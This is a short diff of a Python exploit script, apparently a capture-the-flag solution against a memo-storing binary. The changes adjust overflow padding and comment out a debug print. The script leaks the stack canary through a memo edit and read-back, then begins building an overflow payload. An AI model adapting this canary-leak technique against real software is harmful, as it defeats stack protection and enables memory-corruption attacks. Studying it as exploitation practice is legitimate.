@@ -36,10 +36,10 @@ store_memo(3, 'c' * 16)
 time.sleep(0.3)
 edit_memo(1, 'a' * 16)
 print r.recvline()[:-1]
-edit_memo(3, 'aaaabaaacaaadaaaeaaafaaag')
+edit_memo(3, 'c' * 16 + 'd' * 9)
 print r.recvline()[:-1]
 canary = show_memo(3)
-print "canary length:", len(canary)
+# print "canary length:", len(canary)
 canary = u64(canary[39:39+7].ljust(8, '\x00'))
 print "canary:", hex(canary)
 edit_memo(3, 'c' * 24 + '\x00')
